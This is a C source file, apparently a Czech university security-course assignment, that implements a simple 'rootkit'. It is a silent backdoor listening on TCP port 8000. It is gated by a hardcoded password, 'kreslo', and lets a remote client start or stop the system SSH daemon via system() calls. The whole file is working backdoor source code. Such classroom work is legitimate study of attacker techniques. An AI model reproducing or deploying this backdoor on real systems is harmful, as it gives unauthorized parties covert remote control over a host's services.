/* 
 * File:   rootkit.c
 * Projekt 1 do predmetu BIS - jednoduchy rootkit
 * Author: xpalam00
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

#define BUFFER_LEN 1024

#define HESLO "kreslo"

char nazev_app[20] = "rootkit";
int mySocket;
unsigned DEBUG = 0;
unsigned SILENT = 1;

/**
 * Funkce odesilajici data do socketu.
 */
int sendToClient(char buf[BUFFER_LEN]) {
	if(send(mySocket, buf, strlen(buf), 0) == -1)
	{
		if(!SILENT) fprintf(stderr, "%s: Problem s odeslanim dat.", nazev_app);
		return 1;
	}
	return 0;
}

/**
 * Obsluha preruseni CTRL+C
 */
void SigHandler(int signum)
{
	close(mySocket);
	if( !SILENT ) printf("\r%s: Dekuji za pouziti aplikace. Konec hlaseni.\n", nazev_app);
	exit(0);
}

void help()
{
    sendToClient("--------------------------------------\n");
    sendToClient("Zadejte START pro spusteni SSH demona.\n");
    sendToClient("Zadejte STOP pro vypnuti SSH demona.\n");
    sendToClient("Zadejte EXIT pro odhlaseni.\n");
    sendToClient("--------------------------------------\n");
}

/*
 * 
 */
int main(int argc, char** argv) {

	signal(SIGINT, SigHandler); // obsluha preruseni CTRL+C
	
	int sinlen, s, pid;
	struct sockaddr_in sin;
	
	int port = 8000;
	
	// vytvorim socket
	if( (s = socket(PF_INET, SOCK_STREAM, 0 ) ) < 0)
	{
		if(!SILENT) fprintf(stderr,  "%s: Nepodarilo se vytvorit socket.\n", nazev_app);  // socket error
		return 2;
	}

	sin.sin_family = PF_INET;		// nastavi se rodina protokolu
	sin.sin_port = htons( port );		// nastaví se port, na kterem se posloucha
	sin.sin_addr.s_addr = INADDR_ANY;	// nastavi se vsechny adresy pro prijem

	// nastavi se socket
	if( bind(s, (struct sockaddr *)&sin, sizeof(sin) ) < 0 )
	{
		if(!SILENT) fprintf(stderr, "%s: Chyba pri navazavani socketu.\n", nazev_app);
		return 2;
	}
	
	// zacne se naslouchat na serveru
	if( listen(s, 5) )
	{
		if(!SILENT) fprintf(stderr, "%s: Chyba socketu pri naslouchani.\n", nazev_app);
		return 2;
	}
	sinlen = sizeof(sin);

	if( DEBUG == 1 ) printf("RODIC: Vytvoren socket a cekani na spojeni na portu %d.\n", port);

	do
	{
		// cekani na pozadavek
		if( (mySocket = accept(s, (struct sockaddr *) &sin, (socklen_t *) &sinlen) ) < 0 )
		{
			if(!SILENT) fprintf(stderr, "%s: Chyba pri cekani na pozadavek.\n", nazev_app);
			return 2;
		}

		if( DEBUG == 1 ) printf("RODIC: Prijat pozadavek na spojeni.\n");
		
		// vytvorime novy server pro obslouzeni pozadavku
		if( (pid = fork()) == -1 )
		{
			if(!SILENT) fprintf(stderr, "%s: Nepodarilo se vytvorit novy server pro obslouzeni pozadavku.\n", nazev_app);
			break;
		}

		// v potomkovi se vyridi prichozi spojeni
		if( pid == 0 )
		{
			if( DEBUG == 1 ) printf("POTOMEK: Vytvoren novy potomek. Prichozi spojeni.\n");
			
			char buf[BUFFER_LEN];
			int size = 0;
			
			sprintf(buf, "%s: Uspesne pripojeni na hostilsky stroj.\n", nazev_app);
			sendToClient(buf);
			
			sendToClient("Zadejte jmeno (jakekoli): ");
			size = recv(mySocket, buf, BUFFER_LEN, 0);
			if( size < 0 )
			{
				if(!SILENT) fprintf(stderr, "%s: Nastala chyba pri prijmu dat.\n", nazev_app);
				break;
			}
			
			sendToClient("Zadejte heslo (zkuste kreslo): ");
			
			unsigned pokracovat = 1;
			unsigned prihlasen = 0;
			
			do // obsluha komunikace
			{
				strcpy( buf, "" );
				
				size = recv(mySocket, buf, BUFFER_LEN, 0);
				if( size < 0 )
				{
					if(!SILENT) fprintf(stderr, "%s: Nastala chyba pri prijmu dat.\n", nazev_app);
					break;
				}
				else if( size == 0 )
				{
					if(!SILENT) fprintf(stderr, "%s: Klient ukoncil relaci.\n", nazev_app);
					break;
				}
				else
				{
					buf[size-2] = '\0';
					if( DEBUG == 1 ) printf("POTOMEK: Prichozi pozadavek: -%s-\n", buf);

					if(prihlasen == 0 )
					{
						if(strcmp(buf, "EXIT") == 0) { pokracovat = 0; }
						else if( strcmp(buf, HESLO) == 0 ) {
							prihlasen = 1;
							sendToClient("Prihlaseni heslem bylo uspesne.\n");
							help();
						}
						else {
							sendToClient("Spatne, znovu (opravdu to je kreslo): ");
						}
					}
					else if(strcmp(buf, "HELP") == 0) help();
					else if(strcmp(buf, "EXIT") == 0) pokracovat = 0;
					else if(strcmp(buf, "START") == 0) {
						if( system("/etc/rc.d/init.d/sshd start > /dev/null 2> /dev/null") != -1 )
						{
							sendToClient("Demon SSH spusten.\n");
						}
						else
						{
							sendToClient("Demona se nepodarilo spustit.\n");
						}
					}
					else if(strcmp(buf, "STOP") == 0)
					{
						if( system("/etc/rc.d/init.d/sshd stop > /dev/null 2> /dev/null") != -1 )
						{
							sendToClient("Demon SSH ukoncen.\n");
						}
						else
						{
							sendToClient("Demona se nepodarilo vypnout.\n");
						}
					}
					else help();
				}
			} while( pokracovat );
			
		}
		close(mySocket);

		if( DEBUG == 1 ) if( pid != 0 ) printf("RODIC: Zpracovani bylo predano potomkovi. Bylo uzavreno spojeni, vytvori se nove.\n");
		if( DEBUG == 1 ) if( pid == 0 ) printf("POTOMEK: Byl vyrizen pozadavek. Server konci.\n");
	} while( pid != 0 );

	return (EXIT_SUCCESS);
}
